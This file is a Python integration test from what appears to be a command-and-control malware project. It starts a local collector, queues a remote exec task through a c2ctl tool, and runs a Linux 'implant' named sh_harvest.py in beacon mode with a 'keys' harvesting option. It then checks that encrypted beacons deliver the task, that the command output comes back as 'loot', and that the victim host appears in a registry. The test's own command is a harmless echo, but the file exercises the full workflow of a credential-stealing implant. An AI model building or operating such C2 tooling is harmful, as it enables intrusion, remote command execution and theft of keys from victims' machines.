#!/usr/bin/env python3
"""test_c2_loop.py -- full C2 integration test, runs on any OS.

Boots a real collector on an ephemeral port, queues a task through c2ctl,
runs the linux implant (pure python -- works on Windows CI and ubuntu CI)
in beacon loop mode, and asserts the complete round trip:

    queue task -> beacon delivery (encrypted) -> tasked exec runs ->
    output returns as a task:exec.txt loot part -> host registry updated

This is the claim that previously rested on manual verification only.
"""
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
PY = sys.executable
PSK = "c2loop-unit-psk-3f9a1c"
EXEC_CMD = "echo sh_c2_loop_ok"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def wait_health(port, tries=40):
    for _ in range(tries):
        try:
            with urllib.request.urlopen(
                    "http://127.0.0.1:%d/health" % port, timeout=2) as r:
                if r.status == 200:
                    return True
        except Exception:
            time.sleep(0.25)
    return False


def read_json(p):
    for _ in range(50):
        try:
            return json.load(open(p, encoding="utf-8"))
        except Exception:
            time.sleep(0.2)
    raise AssertionError("never became readable: %s" % p)


def main():
    loot = tempfile.mkdtemp(prefix="sh_c2loop_")
    port = free_port()
    c2 = "http://127.0.0.1:%d/gate" % port

    collector = subprocess.Popen(
        [PY, os.path.join(ROOT, "server", "collector.py"),
         "--port", str(port), "--bind", "127.0.0.1",
         "--psk", PSK, "--loot-dir", loot],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        assert wait_health(port), "collector did not come up"
        print("[ok] collector up on %d, loot -> %s" % (port, loot))

        # queue the exec task under the id the implant will beacon with
        import importlib.util as u
        import platform, getpass
        spec = u.spec_from_file_location("c2ctl", os.path.join(ROOT, "server", "c2ctl.py"))
        c2ctl = u.module_from_spec(spec)
        spec.loader.exec_module(c2ctl)
        hid = "%s-%s" % (platform.node(), getpass.getuser())
        sys.argv = ["c2ctl", "queue", "--loot-dir", loot, hid, "--exec", EXEC_CMD]
        rc = c2ctl.main()
        assert rc == 0, "c2ctl queue failed"
        print("[ok] task queued for %s" % hid)

        r = subprocess.run(
            [PY, os.path.join(ROOT, "linux", "sh_harvest.py"),
             "--only", "keys", "--psk", PSK, "--c2", c2,
             "--loop", "1", "--jitter", "0", "--cycles", "2"],
            capture_output=True, text=True, timeout=120, cwd=ROOT)
        out = r.stdout + r.stderr
        print("[implant] %s" % out.strip().splitlines()[-1] if out.strip() else "")

        # ---- assertions ----
        sys.path.insert(0, os.path.join(ROOT, "server"))
        import shcrypto
        psk = PSK.encode()
        bundles = sorted(
            (f for f in os.listdir(loot) if "-" in f and
             os.path.isdir(os.path.join(loot, f)) and f[0].isalnum()),
            key=lambda d: os.path.getmtime(os.path.join(loot, d)))
        assert len(bundles) >= 2, "expected >=2 bundles, got %d" % len(bundles)

        last = os.path.join(loot, bundles[-1], "bundle.bin")
        manifest, parts = shcrypto.unpack(open(last, "rb").read(), psk)
        pd = dict(parts)
        assert "task:exec.txt" in pd, \
            "task output missing from last bundle: %s" % list(pd)
        exec_out = pd["task:exec.txt"].decode("utf-8", "replace")
        assert "sh_c2_loop_ok" in exec_out, "unexpected exec output: %r" % exec_out
        print("[ok] tasked exec output returned as loot: %r" %
              exec_out.strip()[:40])

        hosts = read_json(os.path.join(loot, "hosts.json"))
        assert hid in hosts, "host not registered: %s" % list(hosts)
        assert hosts[hid]["beacons"] >= 2, "expected >=2 beacons"
        print("[ok] host registry: %s beacons=%d" %
              (hid, hosts[hid]["beacons"]))

        alog = open(os.path.join(loot, "access.log"), encoding="utf-8",
                    errors="replace").read()
        assert "BEACON" in alog, "no BEACON lines in access log"
        print("[ok] access log records beacon/tasking traffic")

        print("\nc2 loop integration OK: queue -> encrypted beacon delivery "
              "-> tasked exec -> loot -> host registry")
        return 0
    finally:
        collector.terminate()
        try:
            collector.wait(10)
        except Exception:
            collector.kill()
        import shutil
        shutil.rmtree(loot, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
